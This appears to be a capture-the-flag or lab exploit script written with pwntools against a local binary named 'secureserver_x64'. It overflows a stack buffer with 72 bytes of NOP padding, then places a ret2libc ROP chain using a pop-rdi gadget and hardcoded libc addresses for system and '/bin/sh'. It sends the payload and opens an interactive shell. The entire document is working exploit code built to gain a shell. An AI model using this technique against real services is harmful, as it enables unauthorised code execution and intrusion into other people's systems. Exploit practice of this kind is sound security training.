from pwn import *

exe = './secureserver_x64'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = process(exe)
padding = 72

pop_rdi = 0x40120b
libc_base = 0x7ffff7dc6000
system = libc_base + 0x4c330
binsh = libc_base + 0x196031

info('system: %#x', system)
info('binsh: %#x', binsh)

payload = flat(
        asm('nop') * padding,
        pop_rdi,
        binsh,
        system
        )

write('payload', payload)

io.sendlineafter(b':', payload)

io.interactive()
